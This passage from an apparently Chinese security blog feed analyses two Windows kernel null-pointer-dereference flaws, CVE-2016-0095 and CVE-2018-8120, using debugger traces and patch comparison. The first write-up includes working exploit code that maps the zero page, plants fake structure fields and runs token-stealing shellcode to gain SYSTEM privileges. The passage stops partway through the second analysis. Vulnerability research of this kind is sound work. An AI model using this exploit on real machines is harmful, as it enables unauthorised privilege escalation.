<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">bGetRealizedBrush</span><span class="params">(struct BRUSH *a1, struct EBRUSHOBJ *EBRUSHOBJ, <span class="keyword">int</span> (__stdcall *a3)(struct _BRUSHOBJ *, struct _SURFOBJ *, struct _SURFOBJ *, struct _SURFOBJ *, struct _XLATEOBJ *, <span class="keyword">unsigned</span> <span class="keyword">int</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们在汇编中找一下蓝屏代码的位置，继续追根溯源，可以发现eax是由<code>[ebx+34h]</code>得到的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">loc_95D40543:</span><br><span class="line">push    ebx</span><br><span class="line">mov     ebx, [ebp+EBRUSHOBJ]</span><br><span class="line">push    esi</span><br><span class="line">xor     esi, esi</span><br><span class="line">mov     [ebp+var_24], eax</span><br><span class="line">mov     eax, [ebx+34h] =&gt; eax初始赋值处</span><br><span class="line">mov     [ebp+arg_0], esi</span><br><span class="line">mov     [ebp+var_2C], esi</span><br><span class="line">mov     [ebp+var_28], 0</span><br><span class="line">mov     eax, [eax+1Ch] =&gt; 取eax+1c处的内容</span><br><span class="line">mov     [ebp+EBRUSHOBJ], eax</span><br><span class="line">test    byte ptr [eax+24h], 1 =&gt; 蓝屏</span><br><span class="line">mov     [ebp+var_1C], esi</span><br><span class="line">mov     [ebp+var_10], esi</span><br><span class="line">jz      short loc_95D4057A</span><br></pre></td></tr></table></figure>
<p>我们在windbg中查询一下<code>[ebx+34h]</code>的结构，发现 +1c 处确实是零，直接拿来引用就会因为没有映射内存而崩溃</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3: kd&gt; dd poi(ebx+34h)</span><br><span class="line">fdad0da8  288508aa 00000001 80000000 889c4800</span><br><span class="line">fdad0db8  00000000 288508aa 00000000 00000000</span><br><span class="line">fdad0dc8  00000008 00000008 00000020 fdad0efc</span><br><span class="line">fdad0dd8  fdad0efc 00000004 00002267 00000001</span><br><span class="line">fdad0de8  02010000 00000000 04000000 00000000</span><br><span class="line">fdad0df8  ffbff968 00000000 00000000 00000000</span><br><span class="line">fdad0e08  00000000 00000000 00000001 00000000</span><br><span class="line">fdad0e18  00000000 00000000 00000000 00000000</span><br><span class="line">3: kd&gt; dd poi(ebx+34h)+1c</span><br><span class="line">fdad0dc4  00000000 00000008 00000008 00000020</span><br><span class="line">fdad0dd4  fdad0efc fdad0efc 00000004 00002267</span><br><span class="line">fdad0de4  00000001 02010000 00000000 04000000</span><br><span class="line">fdad0df4  00000000 ffbff968 00000000 00000000</span><br><span class="line">fdad0e04  00000000 00000000 00000000 00000001</span><br><span class="line">fdad0e14  00000000 00000000 00000000 00000000</span><br><span class="line">fdad0e24  00000000 00000000 fdad0e2c fdad0e2c</span><br><span class="line">fdad0e34  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure>
<p>我们现在需要知道这个 +1c 处的内容是什么意思，根据刚才的回溯信息，我们在最外层的<code>win32k!NtGdiFillRgn+0x339</code>的前一句，也就是调用<code>EngPaint</code>之前下断点观察堆栈情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; u win32k!NtGdiFillRgn+0x334</span><br><span class="line">win32k!NtGdiFillRgn+0x334:</span><br><span class="line">95e3bb98 e8fafaffff      call    win32k!EngPaint (95e3b697)</span><br><span class="line">95e3bb9d 897dfc          mov     dword ptr [ebp-4],edi</span><br><span class="line">95e3bba0 8d4dc4          lea     ecx,[ebp-3Ch]</span><br><span class="line">95e3bba3 e882000000      call    win32k!BRUSHSELOBJ::vDecShareRefCntLazy0 (95e3bc2a)</span><br><span class="line">95e3bba8 8d4dc4          lea     ecx,[ebp-3Ch]</span><br><span class="line">95e3bbab e8258ff7ff      call    win32k!BRUSHSELOBJ::~BRUSHSELOBJ (95db4ad5)</span><br><span class="line">95e3bbb0 8d8dd8feffff    lea     ecx,[ebp-128h]</span><br><span class="line">95e3bbb6 e8d508f9ff      call    win32k!EBRUSHOBJ::vDelete (95dcc490)</span><br><span class="line">0: kd&gt; ba e1 win32k!NtGdiFillRgn+0x334</span><br><span class="line">0: kd&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">win32k!NtGdiFillRgn+0x334:</span><br><span class="line">95e3bb98 e8fafaffff      call    win32k!EngPaint (95e3b697)</span><br><span class="line">0: kd&gt; dd esp</span><br><span class="line">97ffaa5c  fdeac018 97ffaa7c 97ffaaf8 fda86d60</span><br><span class="line">97ffaa6c  00000d0d 1c010886 0016fe9c 95e3b864</span><br><span class="line">97ffaa7c  00023300 00000000 00000000 00000008</span><br><span class="line">97ffaa8c  00000008 00000001 83e7bf6b 842188ea</span><br><span class="line">97ffaa9c  00cff155 00000000 00000000 00026161</span><br><span class="line">97ffaaac  fe9c3008 97ffab7c 97ffaafc 00010001</span><br><span class="line">97ffaabc  87051c35 00000000 00000000 0003767c</span><br><span class="line">97ffaacc  00000000 0003767c 00000000 00026161</span><br></pre></td></tr></table></figure>
<p><code>EngPaint</code>函数参数信息如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">EngPaint</span><span class="params">(struct _SURFOBJ *a1, <span class="keyword">int</span> a2, struct _BRUSHOBJ *a3, struct _POINTL *a4, <span class="keyword">unsigned</span> <span class="keyword">int</span> a5)</span></span></span><br></pre></td></tr></table></figure>
<p>根据参数信息我们可以得到下面这两个关键参数</p>
<ul>
<li>_SURFOBJ    =&gt; fdeac018</li>
<li>_BRUSHOBJ =&gt; 97ffaaf8</li>
</ul>
<p>我们在<code>bGetRealizedBrush</code>处下断，找到这两个参数的位置，根据计算由<code>_BRUSHOBJ</code>推出了<code>_SURFOBJ</code>  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3: kd&gt; ba e1 win32k!bGetRealizedBrush</span><br><span class="line">3: kd&gt; g</span><br><span class="line">Breakpoint 2 hit</span><br><span class="line">win32k!bGetRealizedBrush:</span><br><span class="line">95d40528 8bff            mov     edi,edi</span><br><span class="line">3: kd&gt; r</span><br><span class="line">eax=fdb436e0 ebx=00000000 ecx=00000001 edx=00000000 esi=97ffaaf8 edi=fdeac008</span><br><span class="line">eip=95d40528 esp=97ffa9a4 ebp=97ffa9b8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246</span><br><span class="line">win32k!bGetRealizedBrush:</span><br><span class="line">95d40528 8bff            mov     edi,edi</span><br><span class="line">3: kd&gt; dd esp</span><br><span class="line">97ffa9a4  95d434af fdb436e0 97ffaaf8 95d3d5a0</span><br><span class="line">97ffa9b4  97ffaaf8 97ffaa1c 95db9b5e 97ffaaf8</span><br><span class="line">97ffa9c4  00000001 97ffaa7c fdeac018 84218cca</span><br><span class="line">97ffa9d4  00d14c9b 97ffa9e8 83e80c61 83e3fd72</span><br><span class="line">97ffa9e4  97ffac20 95e3b697 badb0d00 ffb8e748</span><br><span class="line">97ffa9f4  00000000 95dc3098 95e3b864 95e3bb98</span><br><span class="line">97ffaa04  95d40528 00000000 00004000 00000000</span><br><span class="line">97ffaa14  00000000 00000000 97ffaa54 95e3b6e8</span><br><span class="line">3: kd&gt; dd 97ffaaf8 =&gt; _BRUSHOBJ</span><br><span class="line">97ffaaf8  ffffffff 00000000 00000000 00edfc13</span><br><span class="line">97ffab08  00edfc13 00000000 00000006 00000004</span><br><span class="line">97ffab18  00000000 00ffffff fda867c4 00000000</span><br><span class="line">97ffab28  00000000 fdeac008 ffbff968 ffbffe68</span><br><span class="line">97ffab38  ffa1d3a0 00000006 fdb436e0 00000014</span><br><span class="line">97ffab48  00000312 00000001 ffffffff 83f2ff01</span><br><span class="line">97ffab58  83e78892 97ffab7c 97ffabb0 00000000</span><br><span class="line">97ffab68  97ffac10 84218924 00000000 00000000</span><br><span class="line">3: kd&gt; dd poi(97ffaaf8+34h)+10h =&gt; _SURFOBJ</span><br><span class="line">fdeac018  00000000 1f850931 00000000 00000000</span><br><span class="line">fdeac028  00000008 00000008 00000020 fdeac15c</span><br><span class="line">fdeac038  fdeac15c 00000004 00002296 00000001</span><br><span class="line">fdeac048  02010000 00000000 04000000 00000000</span><br><span class="line">fdeac058  ffbff968 00000000 00000000 00000000</span><br><span class="line">fdeac068  00000000 00000000 00000001 00000000</span><br><span class="line">fdeac078  00000000 00000000 00000000 00000000</span><br><span class="line">fdeac088  00000000 fdeac08c fdeac08c 00000000</span><br></pre></td></tr></table></figure>
<p>我们在微软官方可以查询到<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winddi/ns-winddi-surfobj" target="_blank" rel="noopener">_SURFOBJ</a>的结构，总结而言就是<code>_SURFOBJ-&gt;hdev</code>结构为零引用导致蓝屏</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SURFOBJ</span> &#123;</span></span><br><span class="line">  DHSURF dhsurf;</span><br><span class="line">  HSURF  hsurf;</span><br><span class="line">  DHPDEV dhpdev;</span><br><span class="line">  HDEV   hdev;</span><br><span class="line">  SIZEL  sizlBitmap;</span><br><span class="line">  ULONG  cjBits;</span><br><span class="line">  PVOID  pvBits;</span><br><span class="line">  PVOID  pvScan0;</span><br><span class="line">  LONG   lDelta;</span><br><span class="line">  ULONG  iUniq;</span><br><span class="line">  ULONG  iBitmapFormat;</span><br><span class="line">  USHORT iType;</span><br><span class="line">  USHORT fjBitmap;</span><br><span class="line">&#125; SURFOBJ;</span><br></pre></td></tr></table></figure>
<h1 id="0x02：漏洞利用"><a href="#0x02：漏洞利用" class="headerlink" title="0x02：漏洞利用"></a>0x02：漏洞利用</h1><p>从上面的分析我们知道，漏洞的原理是空指针解引用，利用的话肯定是在零页构造内容从而绕过检验，最后运行我们的ShellCode，我们现在需要在<code>bGetRealizedBrush</code>函数中寻找可以给我们利用的片段，从而达到<code>call ShellCode</code>提权的目的，我们可以在IDA中发现以下可能存在的几个片段</p>
<ul>
<li>第一处</li>
</ul>
<p><img src="/2019/08/19/CVE-2016-0095/3.png" alt></p>
<ul>
<li>第二处</li>
</ul>
<p><img src="/2019/08/19/CVE-2016-0095/1.png" alt="1565692816144"></p>
<p>看到第二个片段其实第一个片段都可以忽略了，因为[ebp+arg_8]的位置我们是不可以控制的，而第二个片段edi来自[eax+748h]，所以我们是完完全全可以在零页构造这个结构的，我们只需要将[eax+748h]设置为我们shellcode的位置即可达到提权的目的，我们现在的目标已经清楚了，现在就是观察从漏洞触发点到我们 call edi 之间的一些判断，我们需要修改一些判断从而达到运行我们shellcode的目的，我们首先申请零页内存，运行代码查看函数运行轨迹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	*(FARPROC*)&amp; NtAllocateVirtualMemory = GetProcAddress(</span><br><span class="line">		GetModuleHandleW(<span class="string">L"ntdll"</span>),</span><br><span class="line">		<span class="string">"NtAllocateVirtualMemory"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (NtAllocateVirtualMemory == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[+]Failed to get function NtAllocateVirtualMemory!!!\n"</span>);</span><br><span class="line">		system(<span class="string">"pause"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PVOID Zero_addr = (PVOID)<span class="number">1</span>;</span><br><span class="line">	SIZE_T RegionSize = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Started to alloc zero page...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(NtAllocateVirtualMemory(</span><br><span class="line">		INVALID_HANDLE_VALUE,</span><br><span class="line">		&amp;Zero_addr,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		&amp;RegionSize,</span><br><span class="line">		MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">		PAGE_READWRITE)) || Zero_addr != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[+]Failed to alloc zero page!\n"</span>);</span><br><span class="line">		system(<span class="string">"pause"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Trigger_BSoDPoc();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们单步运行可以发现，我们要到黄色区域必须修改第一处判断，不然程序就不会走到我们想要的地方，然而第一处判断我们只需要让[eax+590h]不为零即可，所以构造如下片段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(DWORD*)(<span class="number">0x590</span>) = (DWORD)<span class="number">0x1</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/19/CVE-2016-0095/4.png" alt="1565696359992"></p>
<p>第二处判断类似，就在第一处的右下角</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(DWORD*)(<span class="number">0x592</span>) = (DWORD)<span class="number">0x1</span>;</span><br></pre></td></tr></table></figure>
<p>最后一步就是放上我们的shellcode了，只是在构造的时候我们需要给他四个参数，当然也可以直接在shellcode里平衡堆栈</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; IDA 里的片段</span><br><span class="line">...</span><br><span class="line">mov     edi, [eax+748h]</span><br><span class="line">...</span><br><span class="line">push    ecx</span><br><span class="line">push    edx</span><br><span class="line">push    [ebp+var_14]</span><br><span class="line">push    eax</span><br><span class="line">call    edi</span><br></pre></td></tr></table></figure>
<p>所以我们构造如下片段即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">ShellCode</span><span class="params">(<span class="keyword">int</span> parameter1,<span class="keyword">int</span> parameter2,<span class="keyword">int</span> parameter3,<span class="keyword">int</span> parameter4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		mov eax, fs: [<span class="number">124</span>h]		<span class="comment">// Find the _KTHREAD structure for the current thread</span></span><br><span class="line">		mov eax, [eax + <span class="number">0x50</span>]   <span class="comment">// Find the _EPROCESS structure</span></span><br><span class="line">		mov ecx, eax</span><br><span class="line">		mov edx, <span class="number">4</span>				<span class="comment">// edx = system PID(4)</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// The loop is to get the _EPROCESS of the system</span></span><br><span class="line">		find_sys_pid :</span><br><span class="line">					 mov eax, [eax + <span class="number">0xb8</span>]	<span class="comment">// Find the process activity list</span></span><br><span class="line">					 sub eax, <span class="number">0xb8</span>    		<span class="comment">// List traversal</span></span><br><span class="line">					 cmp[eax + <span class="number">0xb4</span>], edx    <span class="comment">// Determine whether it is SYSTEM based on PID</span></span><br><span class="line">					 jnz find_sys_pid</span><br><span class="line"></span><br><span class="line">					 <span class="comment">// Replace the Token</span></span><br><span class="line">					 mov edx, [eax + <span class="number">0xf8</span>]</span><br><span class="line">					 mov[ecx + <span class="number">0xf8</span>], edx</span><br><span class="line">					 popad</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">*(DWORD*)(<span class="number">0x748</span>) = (DWORD)&amp; ShellCode;</span><br></pre></td></tr></table></figure>
<p>最后整合一下思路：</p>
<ul>
<li>申请零页内存</li>
<li>绕过判断(两处)</li>
<li>放置shellcode</li>
<li>调用<code>Trigger_BSoDPoc</code>函数运行shellcode提权</li>
</ul>
<p>提权的代码和验证在 =&gt; <a href="https://github.com/ThunderJie/CVE/tree/master/CVE-2016-0095" target="_blank" rel="noopener">这里</a> </p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190813214350-620676ac-bdd0-1.gif" alt="1565696359992"></p>
<h1 id="0x03：后记"><a href="#0x03：后记" class="headerlink" title="0x03：后记"></a>0x03：后记</h1><p>因为是有Poc构造Exploit，所以我们这里利用起来比较轻松，win 7 x64利用也比较简单，修改相应偏移即可</p>
<p>参考资料：</p>
<p>[+] k0shl师傅的分析：<a href="https://whereisk0shl.top/ssctf_pwn450_windows_kernel_exploitation_writeup.html" target="_blank" rel="noopener">https://whereisk0shl.top/ssctf_pwn450_windows_kernel_exploitation_writeup.html</a></p>
]]></content>
      <categories>
        <category>CVE</category>
        <category>Windows Kernel</category>
        <category>Null Pointer Dereference</category>
      </categories>
      <tags>
        <tag>Null Pointer Dereference</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-8120 Windows内核空指针解引用漏洞分析</title>
    <url>/2019/08/17/CVE-2018-8120-Windows%E5%86%85%E6%A0%B8%E7%A9%BA%E6%8C%87%E9%92%88%E8%A7%A3%E5%BC%95%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>2018年5月微软发布了一次安全补丁，其中有一个是对内核空指针解引用的修复，本片文章从补丁对比出发，对该内核漏洞进行分析，对应CVE-2018-8120，实验平台是Windows 7 x86 sp1</p>
<h1 id="0x01：补丁对比"><a href="#0x01：补丁对比" class="headerlink" title="0x01：补丁对比"></a>0x01：补丁对比</h1><p>对比四月和五月的安全补丁可以定位以下几个关键函数，逐个分析观察可以定位到我们本次分析的的关键函数<code>SetImeInfoEx</code></p>
<p><img src="/2019/08/17/CVE-2018-8120-Windows内核空指针解引用漏洞分析/1.png" alt="1560868933354"></p>
<p>可以看到五月的补丁对<code>SetImeInfoEx</code>多了一层检验</p>
<p><img src="/2019/08/17/CVE-2018-8120-Windows内核空指针解引用漏洞分析/2.png" alt="1560869047048"></p>
<p>IDA中观察4月补丁反汇编如下，稍微添加了一些注释</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">stdcall <span class="title">SetImeInfoEx</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> pwinsta, <span class="keyword">const</span> <span class="keyword">void</span> *piiex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = pwinsta;</span><br><span class="line">  <span class="keyword">if</span> ( pwinsta )                                <span class="comment">// 判断 pwinsta 是否为空</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(_DWORD *)(pwinsta + <span class="number">0x14</span>);           <span class="comment">// 获取 pwinsta + 0x14 处的值,也就是 spkList</span></span><br><span class="line">    <span class="keyword">while</span> ( *(_DWORD *)(v3 + <span class="number">0x14</span>) != *(_DWORD *)piiex )<span class="comment">// 未判断指针内容直接引用,触发空指针解引用漏洞</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = *(_DWORD *)(v3 + <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == *(_DWORD *)(pwinsta + <span class="number">0x14</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = *(_DWORD *)(v3 + <span class="number">0x2C</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(v4 + <span class="number">0x48</span>) )</span><br><span class="line">      qmemcpy((<span class="keyword">void</span> *)v4, piiex, <span class="number">0x15C</span>u);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>5月补丁反汇编如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">stdcall <span class="title">SetImeInfoEx</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> pwinsta, <span class="keyword">const</span> <span class="keyword">void</span> *piiex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !pwinsta )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  result = *(_DWORD *)(pwinsta + <span class="number">0x14</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v3 = *(_DWORD *)(pwinsta + <span class="number">0x14</span>);</span><br><span class="line">  <span class="keyword">while</span> ( *(_DWORD *)(v3 + <span class="number">0x14</span>) != *(_DWORD *)piiex )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(_DWORD *)(v3 + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == result )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = *(_DWORD *)(v3 + <span class="number">0x2C</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(v4 + <span class="number">0x48</span>) )</span><br><span class="line">    qmemcpy((<span class="keyword">void</span> *)v4, piiex, <span class="number">0x15C</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到五月的补丁对于参数v3是否为零进行了一次检测，我们对比<code>SetImeInfoEx</code>函数的实现发现，也就是多了对成员域 <code>spklList</code>的检测，v3就是我们的<code>spklList</code>，该函数的主要作用是对扩展结构<code>IMEINFO</code>进行设置</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// nt4 源码</span></span><br><span class="line"><span class="comment">/**************************************************************************\</span></span><br><span class="line"><span class="comment">* SetImeInfoEx</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* Set extended IMEINFO.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* History:</span></span><br><span class="line"><span class="comment">* 21-Mar-1996 wkwok       Created</span></span><br><span class="line"><span class="comment">\**************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetImeInfoEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    PWINDOWSTATION pwinsta,</span></span></span><br><span class="line"><span class="function"><span class="params">    PIMEINFOEX piiex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PKL pkl, pklFirst;</span><br><span class="line"></span><br><span class="line">    UserAssert(pwinsta-&gt;spklList != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pkl = pklFirst = pwinsta-&gt;spklList;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (pkl-&gt;hkl == piiex-&gt;hkl) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Error out for non-IME based keyboard layout.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (pkl-&gt;piiex == <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Update kernel side IMEINFOEX for this keyboard layout</span></span><br><span class="line"><span class="comment">             * only if this is its first loading.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (pkl-&gt;piiex-&gt;fLoadFlag == IMEF_NONLOAD) &#123;</span><br><span class="line">                RtlCopyMemory(pkl-&gt;piiex, piiex, <span class="keyword">sizeof</span>(IMEINFOEX));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        pkl = pkl-&gt;pklNext;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> (pkl != pklFirst);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的修复我们可以在<code>ReorderKeyboardLayouts</code>函数中看到，也是对<code>spklList</code>成员域进行了限制</p>
<p><img src="/2019/08/17/CVE-2018-8120-Windows内核空指针解引用漏洞分析/3.png" alt="1560870519272"></p>
<p><code>ReorderKeyboardLayouts</code>函数实现如下，可以看到函数也对<code>spklList</code>进行了调用，我们这里主要分析<code>SetImeInfoEx</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// nt4 源码</span></span><br><span class="line"><span class="function">VOID <span class="title">ReorderKeyboardLayouts</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    PWINDOWSTATION pwinsta,</span></span></span><br><span class="line"><span class="function"><span class="params">    PKL pkl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PKL pklFirst = pwinsta-&gt;spklList;</span><br><span class="line"></span><br><span class="line">    UserAssert(pklFirst != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If the layout is already at the front of the list there's nothing to do.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (pkl == pklFirst) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Cut pkl from circular list:</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    pkl-&gt;pklPrev-&gt;pklNext = pkl-&gt;pklNext;</span><br><span class="line">    pkl-&gt;pklNext-&gt;pklPrev = pkl-&gt;pklPrev;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Insert pkl at front of list</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    pkl-&gt;pklNext = pklFirst;</span><br><span class="line">    pkl-&gt;pklPrev = pklFirst-&gt;pklPrev;</span><br><span class="line"></span><br><span class="line">    pklFirst-&gt;pklPrev-&gt;pklNext = pkl;</span><br><span class="line">    pklFirst-&gt;pklPrev = pkl;</span><br><span class="line"></span><br><span class="line">    Lock(&amp;pwinsta-&gt;spklList, pkl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结合上面微软对于两个函数的修复，我们可以猜测这次的修复主要是对<code>spklList</code>成员域的错误调用进行修复，从<code>SetImeInfoEx</code>函数的交叉引用中，因为只有一处交叉引用，所以我们可以追溯到调用函数<code>NtUserSetImeInfoEx</code>，通过分析可以看到该函数的主要作用是对进程中的窗口进行设置</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">stdcall <span class="title">NtUserSetImeInfoEx</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> pwinsta; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> piiex; <span class="comment">// [esp+10h] [ebp-178h]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+170h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  UserEnterUserCritSec();</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)gpsi &amp; <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">    v2 = buf;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)buf &gt;= W32UserProbeAddress )</span><br><span class="line">      v2 = (<span class="keyword">char</span> *)W32UserProbeAddress;</span><br><span class="line">    v3 = *v2;</span><br><span class="line">    qmemcpy(&amp;piiex, buf, <span class="number">0x15C</span>u);</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">0xFFFFFFFE</span>;</span><br><span class="line">    pwinsta = _GetProcessWindowStation(<span class="number">0</span>);</span><br><span class="line">    v1 = SetImeInfoEx(pwinsta, &amp;piiex);	<span class="comment">// 